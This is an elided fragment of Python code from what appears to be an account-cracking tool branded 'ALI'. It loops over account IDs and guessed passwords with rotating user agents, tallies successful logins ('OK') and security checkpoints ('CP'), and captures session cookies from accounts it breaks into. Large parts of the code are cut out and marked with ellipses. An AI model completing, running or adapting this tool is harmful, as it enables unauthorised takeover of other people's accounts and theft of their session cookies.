...
def crack(idf,pwv):
	...
	sys.stdout.write(f"\r[ 𝘼𝙇𝙄 ]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{asu})  "),
	sys.stdout.flush()
...
def crackfree(idf,pwv):
	global loop,ok,cp
	sys.stdout.write(f"\r[ 𝘼𝙇𝙄 ]  {P}{b}{loop}{P}•{b}{len(id)}{P}  • OK:{P}{H}{ok}{P} •  CP:{P}{M}{cp}{P} • ({bo}{'{:.0%}'.format(loop/float(len(id)))}{P})  "),
	sys.stdout.flush()
	ua = random.choice(ugen)
	ua2 = random.choice(ugen2)
	ses = requests.Session()
		...
		try:
			...
			if "checkpoint" in po.cookies.get_dict().keys():
				if 'ya' in oprek:
					...
					cetak(nel(statuscp1, title='𝕬𝖑𝖎 CP'))
				...
				if 'no' in taplikasi:
					...
					cetak(nel(statusok1, title='𝕬𝖑𝖎 OK'))
					ok+=1
					break
				elif 'ya' in taplikasi:
					coki=po.cookies.get_dict()
					...
					statusok1 = nel(statusok, style='green')
					cetak(nel(statusok1, title='[bold green]𝕬𝖑𝖎 OK[/bold green]'))
					ok+=1
					break
